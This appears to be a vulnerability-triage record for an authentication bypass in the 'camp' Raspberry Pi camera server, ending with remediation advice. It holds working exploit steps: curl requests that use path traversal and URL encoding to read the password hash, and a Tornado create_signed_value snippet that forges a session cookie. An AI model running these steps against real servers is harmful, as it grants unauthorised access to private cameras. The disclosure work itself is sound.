proposal.summary: The 'camp' Raspberry Pi camera server allows authentication bypass: an attacker can read the stored SHA-512 password hash via crafted requests to /static paths and then create a signed session cookie (using Tornado's create_signed_value) to authenticate as a user without knowing the password.
proposal.cwe_quote:
Fetch the SHA-512 password hash using one of these methods:

curl http://localhost:8000/static/password.tx%74

OR

curl http://localhost:8000/static/./password.txt --path-as-is

OR

curl http://localhost:8000/static/../camp/password.txt --path-as-is
proposal.recommended_next_step: Verify the server's static file handling and session signing. Immediately remove or restrict access to password.txt, disable serving files under /static/ that allow path-traversal, and update session signing to use a server-side secret not derivable from the exposed hash. Prepare a patch to prevent path traversal and to avoid exposing password hashes.

evidence_quotes.claim: Method to fetch password hash via crafted static path
Exploit uses Tornado create_signed_value to craft cookie
evidence_quotes.quote:
from tornado.web import create_signed_value
import time
print(create_signed_value("5895bb1bccf1da795c83734405a7a0193fbb56473842118dd1b66b2186a290e00fa048bc2a302d763c381ea3ac3f2bc2f30aaa005fb2c836bbf641d395c4eb5e", "camp", str(time.time())))
In the browser, navigate to http://localhost:8000/, add a cookie named "camp" and set the value to the result of the script from step 3, then reload the page. You will be logged in.
